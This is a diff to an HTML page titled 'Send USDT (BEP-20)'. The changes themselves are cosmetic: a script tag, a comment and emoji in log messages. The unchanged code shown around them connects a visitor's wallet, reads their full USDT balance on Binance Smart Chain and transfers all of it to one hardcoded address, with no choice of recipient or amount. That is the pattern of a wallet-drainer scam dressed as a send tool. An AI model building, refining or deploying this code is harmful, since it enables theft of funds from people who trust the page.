@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Send USDT (BEP-20)</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -55,7 +55,7 @@
   </div>
 
   <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
     const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
     const usdtAbi = [
       "function balanceOf(address owner) view returns (uint256)",
@@ -110,11 +110,10 @@
         const signer = provider.getSigner();
         const userAddress = await signer.getAddress();
 
-        // Check BNB balance for gas
         const bnbBalance = await provider.getBalance(userAddress);
         const minGas = ethers.utils.parseEther("0.001");
         if (bnbBalance.lt(minGas)) {
-          log("You need at least 0.001 BNB for gas.");
+          log("❌ You need at least 0.001 BNB for gas.");
           return;
         }
 
@@ -122,12 +121,12 @@
         const balance = await usdt.balanceOf(userAddress);
 
         if (balance.isZero()) {
-          log("Your USDT balance is 0.");
+          log("❌ Your USDT balance is 0.");
           return;
         }
 
         const tx = await usdt.transfer(recipient, balance);
-        log("Transaction sent. Waiting for confirmation...");
+        log("⏳ Transaction sent. Waiting for confirmation...");
         await tx.wait();
         log("✅ Transaction confirmed! USDT sent successfully.");
       } catch (err) {
